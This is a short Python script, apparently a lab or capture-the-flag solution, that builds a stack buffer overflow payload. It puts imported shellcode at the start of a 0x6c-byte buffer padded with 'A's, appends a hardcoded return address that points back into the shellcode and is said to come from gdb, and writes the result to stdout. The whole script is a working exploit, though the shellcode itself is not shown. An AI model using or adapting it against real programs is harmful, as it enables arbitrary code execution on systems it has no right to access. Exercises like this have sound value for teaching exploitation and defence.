from shellcode import shellcode
import sys

# shellcode is located at this address by gdb inspection
shellcode_address = 0xfffed70c 

padding = b"A" * 0x6c 

return_address = shellcode_address.to_bytes(4, byteorder='little')

payload = shellcode + padding[len(shellcode):] + return_address

sys.stdout.buffer.write(payload)